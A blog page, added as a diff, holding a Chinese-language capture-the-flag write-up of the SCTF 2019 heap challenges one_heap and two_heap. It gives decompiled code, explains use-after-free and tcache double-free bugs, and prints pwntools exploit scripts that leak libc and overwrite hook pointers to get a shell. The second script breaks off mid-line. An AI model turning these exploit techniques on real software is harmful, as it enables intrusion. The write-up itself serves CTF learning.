@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="SCTF2019pwn题解题目都是堆的题，第一题玄学爆破1/4096，做完校队师傅和我说他1/200的几率都没出来，果然比赛看人脸黑不黑。下面是详细的题解。">
+<meta name="keywords" content="-ctf-pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SCTF-PWN-WP">
+<meta property="og:url" content="http://yoursite.com/2019/06/27/SCTF2019-PWN-WP/index.html">
+<meta property="og:site_name" content="peanuts&#39;blog">
+<meta property="og:description" content="SCTF2019pwn题解题目都是堆的题，第一题玄学爆破1/4096，做完校队师傅和我说他1/200的几率都没出来，果然比赛看人脸黑不黑。下面是详细的题解。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-06-27T12:56:01.130Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SCTF-PWN-WP">
+<meta name="twitter:description" content="SCTF2019pwn题解题目都是堆的题，第一题玄学爆破1/4096，做完校队师傅和我说他1/200的几率都没出来，果然比赛看人脸黑不黑。下面是详细的题解。">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2019/06/27/SCTF2019-PWN-WP/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>SCTF-PWN-WP | peanuts'blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">peanuts'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-mylove">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/Mylove/" rel="section"><i class="menu-item-icon fa fa-fw fa-heart"></i> <br>Mylove</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/27/SCTF2019-PWN-WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="peanuts">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="peanuts'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SCTF-PWN-WP
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-06-27 20:53:47 / Modified: 20:56:01" itemprop="dateCreated datePublished" datetime="2019-06-27T20:53:47+08:00">2019-06-27</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SCTF2019pwn题解"><a href="#SCTF2019pwn题解" class="headerlink" title="SCTF2019pwn题解"></a>SCTF2019pwn题解</h1><p>题目都是堆的题，第一题玄学爆破1/4096，做完校队师傅和我说他1/200的几率都没出来，果然比赛看人脸黑不黑。下面是详细的题解。<br><a id="more"></a></p>
+<h2 id="one-heap"><a href="#one-heap" class="headerlink" title="one_heap"></a>one_heap</h2><p>题目看起来并不难，逻辑很简单，并且给了libc是2.27的所以自然的联想到又tcache，接下来进行详细的分析。</p>
+<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>逻辑很简单这里我进行了一个函数名的改变看起来清楚一点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // eax</span><br><span class="line"></span><br><span class="line">  flash();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = menu(); i != 1; i = menu() )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( i != 2 )</span><br><span class="line">        exit(0);</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    add(a1, a2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h4><p>简单的choice逻辑没有什么问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_C70()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v0; // ST08_8</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  unsigned __int64 v2; // rt1</span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;1. new&quot;);</span><br><span class="line">  puts(&quot;2. delete&quot;);</span><br><span class="line">  _printf_chk(1LL, &quot;Your choice:&quot;);</span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  result = v2 ^ v0;</span><br><span class="line">  if ( v2 == v0 )</span><br><span class="line">    result = sub_C10();</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure>
+<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>这里是主要的问题点，存在一个uaf的漏洞但是同样对free的次数存在限制总共只能free 4次，然后free的时候是没有idx选择，每次ptr位置只有一个堆块的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_D90()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v1; // [rsp+8h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(0x28u);</span><br><span class="line">  if ( !dword_202014 )</span><br><span class="line">    exit(0);</span><br><span class="line">  free(ptr);</span><br><span class="line">  puts(&quot;Done!&quot;);</span><br><span class="line">  --dword_202014;</span><br><span class="line">  return __readfsqword(0x28u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>这里任意malloc的大小存在限制，并且malloc的数量也是固定的，然后malloc后可以读入堆。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line">  size_t v1; // rbx</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  if ( !dword_202010 )</span><br><span class="line">LABEL_5:</span><br><span class="line">    exit(0);</span><br><span class="line">  _printf_chk(1LL, &quot;Input the size:&quot;);</span><br><span class="line">  v0 = sub_C10(1LL, &quot;Input the size:&quot;);</span><br><span class="line">  v1 = (signed int)v0;</span><br><span class="line">  if ( v0 &gt; 0x7F )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid size!&quot;);</span><br><span class="line">    goto LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  _printf_chk(1LL, &quot;Input the content:&quot;);</span><br><span class="line">  ptr = malloc(v1);</span><br><span class="line">  sub_B70(ptr, v1);</span><br><span class="line">  puts(&quot;Done!&quot;);</span><br><span class="line">  --dword_202010;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><ol>
+<li>因为存在tcache所以这里double free利用起来会比较顺手，但是存在一个问题如何去leak。这里参考了HITCON2018的baby_tcache的leak思路，是利用覆盖stdout的write_buf实现的。</li>
+<li>还有个问题如何能染tcache被malloc到那个位置，这里我采用的是利用堆和code段偏移来爆破几率大概是在1/4096，这个几率真的看脸了。。。</li>
+<li>再去改写malloc_hook，这里会发现3个one都没有办法用，所以只能用realloc的trick来调整栈去getshell。</li>
+</ol>
+<blockquote>
+<p>这里调试可以吧本地随机化关了，如果预期解是这样的话。。我就真的没话说了，如果这是非预期。。（对不住了出题人。。</p>
+</blockquote>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = process(<span class="string">"./one_heap"</span>)</span><br><span class="line">a = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="comment">#p = remote("47.104.89.129",10001)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the content:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new0</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">"aaa"</span>)</span><br><span class="line">remove()</span><br><span class="line">remove()</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">"\x20\x60"</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">"b"</span>)</span><br><span class="line">raw_input()</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">"\x60\x07"</span>)</span><br><span class="line">pay = p64(<span class="number">0xfbad1880</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">"\x00"</span></span><br><span class="line">new(<span class="number">0x60</span>,pay)</span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">8</span>:<span class="number">8</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3ed8b0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">malloc_hook = a.symbols[<span class="string">"__malloc_hook"</span>]+libc_addr</span><br><span class="line">relloc_hook = a.symbols[<span class="string">"__realloc_hook"</span>]+libc_addr</span><br><span class="line"><span class="keyword">print</span> hex(malloc_hook)</span><br><span class="line">one = <span class="number">0x4f2c5</span>+libc_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> one</span><br><span class="line">new(<span class="number">0x50</span>,<span class="string">"a"</span>)</span><br><span class="line">remove()</span><br><span class="line">remove()</span><br><span class="line">new(<span class="number">0x50</span>,p64(relloc_hook))</span><br><span class="line">new(<span class="number">0x50</span>,<span class="string">"peanuts"</span>)</span><br><span class="line">new(<span class="number">0x50</span>,p64(one)+p64(libc_addr+a.sym[<span class="string">'realloc'</span>]+<span class="number">0xe</span>))</span><br><span class="line"><span class="keyword">print</span> hex(one)</span><br><span class="line">new(<span class="number">0x30</span>,<span class="string">"b"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="two-heap"><a href="#two-heap" class="headerlink" title="two_heap"></a>two_heap</h2><p>这个题刚开始感觉是和one_heap相同，可能也是爆破，但是发现了size存在限制需要绕过所以就不想one_heap了，这个size限制导致我们只能利用3个左右的堆块。</p>
+<h3 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h4><p>这里我也标出了函数，这个函数主要的作用是在leak上，因为printf_chk可以做到用%a去leak，具体可以参考BCTF和HCTF的题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  __int64 v4; // [rsp+1Ch] [rbp-1Ch]</span><br><span class="line">  int v5; // [rsp+24h] [rbp-14h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+28h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  sub_12D0(a1, a2, a3);</span><br><span class="line">  v4 = 0LL;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  puts(&quot;Welcome to SCTF:&quot;);</span><br><span class="line">  leak(&amp;v4, 11);</span><br><span class="line">  __printf_chk(1LL, &amp;v4, 0xFFFFFFFFLL, 0xFFFFFFFFLL, 0xFFFFFFFFLL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      if ( v3 != 1 )</span><br><span class="line">        break;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 != 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;exit.&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    del();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="add-1"><a href="#add-1" class="headerlink" title="add"></a>add</h4><p>主要是add了堆块，并且进行了一个位运算使得末尾成为了一个0x0或者是0x8的数,当然这里是可以绕过的，他没有检查堆块size的大小所以可以魔改操作一波</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_14A0()</span><br><span class="line">&#123;</span><br><span class="line">  FILE **v0; // rbp</span><br><span class="line">  __int64 v1; // rbx</span><br><span class="line">  __int64 **v2; // rax</span><br><span class="line">  int v3; // er12</span><br><span class="line">  __int64 *v4; // rbp</span><br><span class="line">  __int64 **v5; // rbx</span><br><span class="line">  unsigned __int64 v7; // [rsp+8h] [rbp-30h]</span><br><span class="line"></span><br><span class="line">  v0 = (FILE **)&amp;off_4020;</span><br><span class="line">  v1 = 0LL;</span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  v2 = &amp;off_4020;</span><br><span class="line">  while ( v2[1] )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v1;</span><br><span class="line">    v2 += 2;</span><br><span class="line">    if ( v1 == 8 )</span><br><span class="line">      goto LABEL_4;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Input the size:&quot;);</span><br><span class="line">  v3 = sub_13E0(&quot;Input the size:&quot;) &amp; 0xFFFFFFF8;</span><br><span class="line">  if ( v3 &gt; 128 )</span><br><span class="line">    goto LABEL_4;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(_DWORD *)v0 == v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;I don&apos;t like the same size!&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 += 2;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( &amp;stdout != v0 );</span><br><span class="line">  v4 = (__int64 *)malloc(v3);</span><br><span class="line">  if ( !v4 )</span><br><span class="line">LABEL_4:</span><br><span class="line">    exit(0);</span><br><span class="line">  puts(&quot;Input the note:&quot;);</span><br><span class="line">  v5 = &amp;(&amp;off_4020)[2 * v1];</span><br><span class="line">  leak(v4, v3);</span><br><span class="line">  *(_DWORD *)v5 = v3;</span><br><span class="line">  v5[1] = v4;</span><br><span class="line">  return __readfsqword(0x28u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="del"><a href="#del" class="headerlink" title="del"></a>del</h4><p>删除函数同样是没有对指针置0，漏洞很明显，就是利用起来比较困难了。这里检查了一下idx是否符合要求。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void sub_15A0()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rax</span><br><span class="line">  unsigned __int64 v1; // [rsp+8h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Input the index:&quot;);</span><br><span class="line">  v0 = (signed int)sub_13E0(&quot;Input the index:&quot;);</span><br><span class="line">  if ( (unsigned __int64)(signed int)v0 &gt; 7 )</span><br><span class="line">    exit(0);</span><br><span class="line">  if ( __readfsqword(0x28u) == v1 )</span><br><span class="line">    free((&amp;off_4020)[2 * v0 + 1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h3><ol>
+<li>首先因为存在printf_chk可以用%a去leak，这里有个小技巧，当得到的是p字符的时候用0去替换掉。然后就可以计算出地址，有了leak的地址就容易的多了</li>
+<li>有了leak利用malloc size = 0x1,0x8,0x10,0x18来进行对size的绕过就可以利用了，说实话这个题比one简单。。</li>
+</ol>
+<blockquote>
+<p>感觉这个题目出的可以，都是知识盲区现找现查，学到很多。</p>
+</blockquote>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p = process("./two_heap",env=&#123;"LD_PRELOAD":"./libc-2.26.so"&#125;)</span></span><br><span class="line">a = ELF(<span class="string">"./libc-2.26.so"</span>)</span><br><span class="line">p = remote(<span class="string">"47.104.89.129"</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)#,"b *0x5555555554a0")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the note:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the index:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new0</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span 